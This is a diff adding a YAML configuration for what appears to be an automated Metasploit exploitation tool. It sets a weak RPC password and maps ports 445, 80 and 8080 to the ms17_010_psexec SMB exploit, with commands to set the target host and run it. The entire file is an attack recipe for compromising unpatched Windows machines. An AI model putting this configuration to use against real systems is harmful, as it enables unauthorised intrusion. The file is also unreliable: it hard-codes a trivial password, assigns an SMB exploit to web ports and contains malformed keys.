@@ -1,0 +1,23 @@
+msfrpc:
+    password: 123123
+
+ports:
+    445:
+        pre-modules: 123
+        main-modules:
+                - exploit/windows/smb/ms17_010_psexec:
+                        raiting: 5.0
+                        commands:
+                                - set RHOST <RHOST>
+                                - run
+        post-modules: null
+
+    80,8080:
+        pre-modules: null
+        main-modules:
+                - exploit/windows/smb/ms17_010_psexec:
+                        raiting: 5.0
+                        commands:
+                                - set RHOST <RHOST>
+                                - run
+        post-modules: null
